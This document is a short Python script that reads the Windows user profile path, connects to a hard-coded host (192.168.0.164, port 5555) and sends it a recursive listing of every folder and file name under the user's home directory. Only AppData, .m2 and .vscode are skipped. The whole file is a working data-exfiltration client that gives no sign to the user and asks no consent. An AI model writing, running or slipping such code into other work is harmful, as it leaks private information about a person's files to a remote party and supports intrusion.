import os, socket

def getUserDirectory():
    path = os.getenv("USERPROFILE")
    if(path != None):
        return path
    else:
        print("No path found")
   
   
if __name__ == "__main__":
    HOST = '192.168.0.164'
    PORT = 5555
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((HOST, PORT))

    pathP = getUserDirectory()
    server.send(pathP.encode())
    server.send("\n".encode())

    for path, dirnames, filenames in os.walk(pathP):
        if(path.find("AppData") != -1 or path.find(".m2") != -1 or path.find(".vscode") != -1):
            continue
        server.sendall(str.encode(" ".join([str(path), str(dirnames), str(filenames)])))
        server.send("\n".encode())
    server.close()


